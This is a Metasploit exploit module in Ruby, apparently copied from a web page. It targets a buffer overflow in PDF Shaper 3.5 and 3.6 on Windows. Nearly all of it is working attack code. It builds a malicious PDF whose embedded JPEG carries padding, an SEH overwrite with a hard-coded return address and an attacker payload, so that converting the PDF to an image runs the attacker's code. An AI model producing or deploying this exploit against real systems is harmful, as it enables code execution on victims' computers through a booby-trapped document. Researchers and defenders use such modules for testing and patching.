# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::PDF
  include Msf::Exploit::Seh

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;PDF Shaper Buffer Overflow&#039;,
      &#039;Description&#039;     => %q{
          PDF Shaper is prone to a security vulnerability when processing PDF files.
        The vulnerability appear when we use Convert PDF to Image and use a specially
        crafted PDF file. This module has been tested successfully on Win Xp, Win 7,
        Win 8, Win 10.
      },
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Author&#039;          =>
        [
          &#039;metacom27[at]gmail.com - twitter.com/m3tac0m&#039;, # POC
          &#039;metacom&#039; # MSF Module
        ],
      &#039;References&#039;      =>
        [
          [&#039;URL&#039;, &#039;https://www.exploit-db.com/exploits/37760/&#039;]
        ],
      &#039;DefaultOptions&#039;  =>
        {
          &#039;EXITFUNC&#039; => &#039;process&#039;, # none/process/thread/seh
        },
      &#039;Platform&#039;        => &#039;win&#039;,
      &#039;Payload&#039;         =>
        {
          &#039;Space&#039; => 2000,
          &#039;DisableNops&#039; => true
        },
      &#039;Targets&#039;         =>
        [
          [&#039;<Win Xp, Win 7, Win 8, Win 10 / PDF Shaper v.3.5 and v.3.6>&#039;,
           {
             &#039;Ret&#039; => 0x00402AC1, # PDFTools.exe
             &#039;Offset&#039; => 433
           }
          ]
        ],
      &#039;Privileged&#039;      => false,
      &#039;DisclosureDate&#039;  => &#039;Oct 03 2015&#039;,
      &#039;DefaultTarget&#039;   => 0
    ))

    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [false, &#039;The file name.&#039;, &#039;msf.pdf&#039;])
      ], self.class
    )
  end

  def exploit
    file_create(make_pdf)
  end

  def jpeg
    buffer = "\xFF\xD8\xFF\xEE\x00\x0E\x41\x64\x6F\x62\x65\x00\x64\x80\x00\x00"
    buffer << "\x00\x02\xFF\xDB\x00\x84\x00\x02\x02\x02\x02\x02\x02\x02\x02\x02"
    buffer << "\x02\x03\x02\x02\x02\x03\x04\x03\x03\x03\x03\x04\x05\x04\x04\x04"
    buffer << "\x04\x04\x05\x05\x05\x05\x05\x05\x05\x05\x05\x05\x07\x08\x08\x08"
    buffer << "\x07\x05\x09\x0A\x0A\x0A\x0A\x09\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x0C"
    buffer << "\x0C\x0C\x0C\x0C\x0C\x0C\x0C\x01\x03\x02\x02\x03\x03\x03\x07\x05"
    buffer << "\x05\x07\x0D\x0A\x09\x0A\x0D\x0F\x0D\x0D\x0D\x0D\x0F\x0F\x0C\x0C"
    buffer << "\x0C\x0C\x0C\x0F\x0F\x0C\x0C\x0C\x0C\x0C\x0C\x0F\x0C\x0E\x0E\x0E"
    buffer << "\x0E\x0E\x0C\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11\x11"
    buffer << "\x11\x11\x11\x11\x11\x11\x11\x11\xFF\xC0\x00\x14\x08\x00\x32\x00"
    buffer << "\xE6\x04\x01\x11\x00\x02\x11\x01\x03\x11\x01\x04\x11\x00\xFF\xC4"
    buffer << "\x01\xA2\x00\x00\x00\x07\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00"
    buffer << "\x00\x00\x00\x04\x05\x03\x02\x06\x01\x00\x07\x08\x09\x0A\x0B\x01"
    buffer << "\x54\x02\x02\x03\x01\x01\x01\x01\x01\x00\x00\x00\x00\x00\x00\x00"
    buffer << "\x01\x00\x02\x03\x04\x05\x06\x07"
    buffer << rand_text(target[&#039;Offset&#039;]) # junk
    buffer << generate_seh_record(target.ret)
    buffer << payload.encoded
    buffer << rand_text(2388 - payload.encoded.length)
    buffer
  end

  def make_pdf
    @pdf << header
    add_object(1, "<</Type/Catalog/Outlines 2 0 R /Pages 3 0 R>>")
    add_object(2, "<</Type/Outlines>>")
    add_object(3, "<</Type/Pages/Kids[5 0 R]/Count 1/Resources <</ProcSet 4 0 R/XObject <</I0 7 0 R>>>>/MediaBox[0 0 612.0 792.0]>>")
    add_object(4, "[/PDF/Text/ImageC]")
    add_object(5, "<</Type/Page/Parent 3 0 R/Contents 6 0 R>>")
    stream_1 = "stream" << eol
    stream_1 << "0.000 0.000 0.000 rg 0.000 0.000 0.000 RG q 265.000 0 0 229.000 41.000 522.000 cm /I0 Do Q" << eol
    stream_1 << "endstream" << eol
    add_object(6, "<</Length 91>>#{stream_1}")
    stream = "<<" << eol
    stream << "/Width 230" << eol
    stream << "/BitsPerComponent 8" << eol
    stream << "/Name /X" << eol
    stream << "/Height 50" << eol
    stream << "/Intent /RelativeColorimetric" << eol
    stream << "/Subtype /Image" << eol
    stream << "/Filter /DCTDecode" << eol
    stream << "/Length #{jpeg.length}" << eol
    stream << "/ColorSpace /DeviceCMYK" << eol
    stream << "/Type /XObject" << eol
    stream << ">>"
    stream << "stream" << eol
    stream << jpeg << eol
    stream << "endstream" << eol
    add_object(7, stream)
    finish_pdf
  end
end

